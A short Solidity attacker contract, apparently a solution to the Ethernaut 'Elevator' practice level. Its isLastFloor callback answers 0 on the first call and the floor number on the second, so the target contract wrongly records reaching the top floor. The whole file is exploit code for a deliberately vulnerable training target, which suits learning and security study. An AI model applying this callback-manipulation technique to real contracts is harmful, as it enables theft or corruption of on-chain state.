// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator {
  function goTo(uint _floor) external; 
}

contract Building {

    Elevator elevatorContract;
    bool flag;

    constructor(address _elevator) {
        elevatorContract = Elevator(_elevator);
        flag = false;
    }

  function attack() external {
    elevatorContract.goTo(1);
  }

  function isLastFloor(uint floor) external returns (uint) {
    if (!flag) {
        flag = true;
        return 0;
    }
    return floor;
  }
}